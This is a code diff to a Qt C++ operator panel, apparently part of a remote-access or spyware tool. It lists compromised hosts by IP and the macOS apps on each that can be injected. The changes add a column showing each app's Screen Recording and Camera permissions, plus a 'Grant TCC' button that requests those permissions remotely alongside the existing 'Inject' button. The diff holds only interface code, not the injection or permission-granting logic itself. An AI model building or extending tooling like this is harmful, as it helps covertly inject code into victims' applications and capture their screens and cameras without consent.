@@ -4,6 +4,7 @@
 #include <QHeaderView>
 #include <QFileInfo>
 #include <QPushButton>
+#include <QLabel>
 
 namespace inferno {
 
@@ -17,18 +18,26 @@ static QString capabilityName(int cap) {
     }
 }
 
+QString InjectionPanel::tccIcon(bool hasScreenRecording, bool hasCamera) const {
+    if (hasScreenRecording && hasCamera) return QString::fromUtf8("🎥📷");
+    if (hasScreenRecording) return QString::fromUtf8("🎥");
+    if (hasCamera) return QString::fromUtf8("📷");
+    return QString::fromUtf8("❌");
+}
+
 InjectionPanel::InjectionPanel(QWidget* parent)
     : QWidget(parent)
 {
     auto* layout = new QVBoxLayout(this);
 
-    m_table = new QTableWidget(0, 5, this);
+    m_table = new QTableWidget(0, 6, this);
     m_table->setHorizontalHeaderLabels({
-        "Agent", "Target App", "Vector", "Status", "Action"
+        "Agent", "Target App", "Vector", "TCC", "Status", "Action"
     });
     m_table->horizontalHeader()->setStretchLastSection(false);
-    m_table->horizontalHeader()->setSectionResizeMode(4, QHeaderView::Fixed);
-    m_table->setColumnWidth(4, 110);
+    m_table->horizontalHeader()->setSectionResizeMode(5, QHeaderView::Fixed);
+    m_table->setColumnWidth(5, 160);
+    m_table->setColumnWidth(3, 60);
     m_table->setEditTriggers(QAbstractItemView::NoEditTriggers);
     m_table->setSelectionBehavior(QAbstractItemView::SelectRows);
     m_table->setStyleSheet(ui::style::INTEL_TABLE);
@@ -36,28 +45,51 @@ InjectionPanel::InjectionPanel(QWidget* parent)
     layout->addWidget(m_table);
 }
 
-void InjectionPanel::addActionButton(int row, const QString& ip, const QString& fullPath, bool isInjected) {
-    auto* btn = new QPushButton(isInjected ? "Injected" : "Inject");
-    btn->setEnabled(!isInjected);
+void InjectionPanel::addActionButton(int row, const QString& ip,
+                                      const QString& fullPath, bool isInjected) {
+    auto* container = new QWidget();
+    auto* layout = new QHBoxLayout(container);
+    layout->setContentsMargins(2, 2, 2, 2);
+    layout->setSpacing(4);
 
+    auto* injectBtn = new QPushButton(isInjected ? "✅" : "Inject");
+    injectBtn->setFixedSize(60, 30);
     if (isInjected) {
-        btn->setFixedSize(95, 34);
-        btn->setStyleSheet(
-            "QPushButton { background: #333; color: #666; border: 1px solid #444; "
-            "font-size: 13px; border-radius: 4px; }");
+        injectBtn->setStyleSheet(
+            "QPushButton { background: #333; color: #666; "
+            "border: 1px solid #444; font-size: 12px; border-radius: 4px; }");
     } else {
-        btn->setFixedSize(95, 34);
-        btn->setStyleSheet(
-            "QPushButton { background: #004d00; color: #00ff41; border: 2px solid #00ff41; "
-            "font-size: 13px; border-radius: 4px; font-weight: bold; }"
+        injectBtn->setStyleSheet(
+            "QPushButton { background: #004d00; color: #00ff41; "
+            "border: 2px solid #00ff41; font-size: 12px; border-radius: 4px; "
+            "font-weight: bold; }"
             "QPushButton:hover { background: #00ff41; color: #000; }");
+        injectBtn->setEnabled(true);
     }
-
-    connect(btn, &QPushButton::clicked, this, [this, ip, fullPath]() {
+    connect(injectBtn, &QPushButton::clicked, this, [this, ip, fullPath]() {
         emit injectRequested(ip, fullPath);
     });
+    layout->addWidget(injectBtn);
 
-    m_table->setCellWidget(row, 4, btn);
+    // Grant TCC button (only on macOS, when not injected yet)
+    QPushButton* tccBtn = nullptr;
+    QTableWidgetItem* tccItem = m_table->item(row, 3);
+    if (tccItem && tccItem->text() == QString::fromUtf8("❌") && !isInjected) {
+        tccBtn = new QPushButton("Grant TCC");
+        tccBtn->setFixedSize(80, 30);
+        tccBtn->setStyleSheet(
+            "QPushButton { background: #1a1a4e; color: #4488ff; "
+            "border: 1px solid #4488ff; font-size: 11px; border-radius: 4px; }"
+            "QPushButton:hover { background: #2a2a5e; }");
+        tccBtn->setEnabled(true);
+        QString bundleId = tccItem->data(Qt::UserRole).toString();
+        connect(tccBtn, &QPushButton::clicked, this, [this, ip, bundleId]() {
+            emit tccGrantRequested(ip, bundleId);
+        });
+        layout->addWidget(tccBtn);
+    }
+
+    m_table->setCellWidget(row, 5, container);
 }
 
 void InjectionPanel::onScanResult(const QString& ip, const QString& report) {
@@ -74,19 +106,24 @@ void InjectionPanel::onScanResult(const QString& ip, const QString& report) {
         m_table->setItem(row, 0, new QTableWidgetItem(ip));
         m_table->setItem(row, 1, new QTableWidgetItem("(none)"));
         m_table->setItem(row, 2, new QTableWidgetItem("-"));
-        m_table->setItem(row, 3, new QTableWidgetItem("No injectable apps"));
+        m_table->setItem(row, 3, new QTableWidgetItem("-"));
+        m_table->setItem(row, 4, new QTableWidgetItem("No injectable apps"));
         return;
     }
 
     for (const QString& line : lines) {
         QStringList parts = line.split('|');
+        // Format: path|bundle_id|capability|is_host|has_sr|has_camera
         if (parts.size() < 4) continue;
 
         QString fullPath = parts[0];
+        QString bundleId = parts.size() >= 2 ? parts[1] : "";
         QFileInfo fi(fullPath);
         QString appName = fi.baseName();
         int cap = parts[2].toInt();
         bool isInjected = parts[3] == "1";
+        bool hasSR = parts.size() >= 5 ? parts[4] == "1" : false;
+        bool hasCam = parts.size() >= 6 ? parts[5] == "1" : false;
 
         int row = m_table->rowCount();
         m_table->insertRow(row);
@@ -97,22 +134,54 @@ void InjectionPanel::onScanResult(const QString& ip, const QString& report) {
         m_table->setItem(row, 1, nameItem);
 
         m_table->setItem(row, 2, new QTableWidgetItem(capabilityName(cap)));
-        m_table->setItem(row, 3, new QTableWidgetItem(
+
+        auto* tccItem = new QTableWidgetItem(tccIcon(hasSR, hasCam));
+        tccItem->setData(Qt::UserRole, bundleId);
+        tccItem->setToolTip(
+            hasSR && hasCam ? "Screen Recording + Camera"
+            : hasSR ? "Screen Recording only"
+            : hasCam ? "Camera only"
+            : "No TCC permissions");
+        m_table->setItem(row, 3, tccItem);
+
+        m_table->setItem(row, 4, new QTableWidgetItem(
             isInjected ? "✅ Injected" : "Ready"));
 
         addActionButton(row, ip, fullPath, isInjected);
     }
 }
 
-void InjectionPanel::onInjectResult(const QString& ip, bool success, const QString& targetPath) {
+void InjectionPanel::onInjectResult(const QString& ip, bool success,
+                                     const QString& targetPath) {
     for (int row = 0; row < m_table->rowCount(); ++row) {
         QString rowIp = m_table->item(row, 0)->text();
         QString rowPath = m_table->item(row, 1)->data(Qt::UserRole).toString();
         if (rowIp == ip && rowPath == targetPath) {
-            m_table->item(row, 3)->setText(success ? "✅ Injected" : "❌ Failed");
-            // Replace action button with disabled one
-            m_table->removeCellWidget(row, 4);
+            m_table->item(row, 4)->setText(
+                success ? "✅ Injected" : "❌ Failed");
+            m_table->removeCellWidget(row, 5);
             addActionButton(row, ip, targetPath, true);
+            break;
+        }
+    }
+}
+
+void InjectionPanel::onTccGrantResult(const QString& ip,
+                                       const QString& /*bundleId*/,
+                                       bool success) {
+    if (!success) return;
+    for (int row = 0; row < m_table->rowCount(); ++row) {
+        if (m_table->item(row, 0)->text() == ip) {
+            auto* tccItem = m_table->item(row, 3);
+            if (tccItem) {
+                tccItem->setText(tccIcon(true, true));
+                tccItem->setToolTip("Screen Recording + Camera (granted)");
+            }
+            // Refresh action buttons (Grant TCC button will be removed)
+            QString fullPath = m_table->item(row, 1)->data(Qt::UserRole).toString();
+            bool isInjected = m_table->item(row, 4)->text().contains("Injected");
+            m_table->removeCellWidget(row, 5);
+            addActionButton(row, ip, fullPath, isInjected);
             break;
         }
     }
